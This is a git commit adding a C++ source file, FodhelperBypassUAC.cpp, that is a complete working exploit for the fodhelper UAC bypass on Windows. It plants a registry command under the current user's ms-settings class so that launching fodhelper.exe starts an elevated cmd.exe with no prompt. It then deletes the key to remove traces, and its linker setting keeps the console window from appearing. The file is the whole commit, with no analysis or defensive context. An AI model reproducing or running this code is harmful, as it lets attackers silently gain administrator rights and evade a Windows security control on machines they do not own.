c272b74108166b5bd58157bd19b64e9b95b5fb59
真 罗 <1959132915@qq.com>
2020-03-25 11:39:12 +0800

    添加项目文件。

---
+++ FodhelperBypassUAC/FodhelperBypassUAC.cpp
@@ -0,0 +1,20 @@
+﻿#include <windows.h>
+#include <stdio.h>
+#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
+
+int main(int argc, char* argv[]) {
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFOA si = { 0 };
+	HKEY hKey;
+
+	si.cb = sizeof(STARTUPINFO);
+	si.wShowWindow = SW_HIDE;
+	RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
+	RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)"cmd.exe", strlen("cmd.exe"));
+	RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
+	CreateProcessA("C:\\Windows\\System32\\cmd.exe",(LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
+	Sleep(5000);
+	RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
+
+	return 0;
+}
